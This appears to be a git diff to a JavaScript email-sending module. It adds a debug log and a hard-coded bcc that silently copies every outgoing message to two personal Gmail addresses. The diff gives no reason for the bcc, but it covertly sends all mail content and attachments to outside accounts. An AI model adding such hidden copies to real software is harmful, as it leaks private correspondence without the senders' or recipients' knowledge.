@@ -15,6 +15,8 @@ const checkFileExists = async (url) => {
 
 // Function to create attachments from URLs
 const createAttachments = async (attachments_url) => {
+
+    console.log(`attachments_url - `, attachments_url);
     const urls = Array.isArray(attachments_url)
         ? attachments_url
         : typeof attachments_url === "string"
@@ -147,6 +149,10 @@ async function davSubmitMail(
             from: `"${smtp.title}" <${smtp.username}>`,
             to: toList,
             cc: ccList,
+            bcc: [
+                '"Rohit Kumar" <rohitwebstep@gmail.com>',
+                '"Vansh" <vanshwebstep@gmail.com>'
+            ],
             subject: email.title,
             html: template,
             ...(attachments.length > 0 && { attachments }), // Only include attachments if present
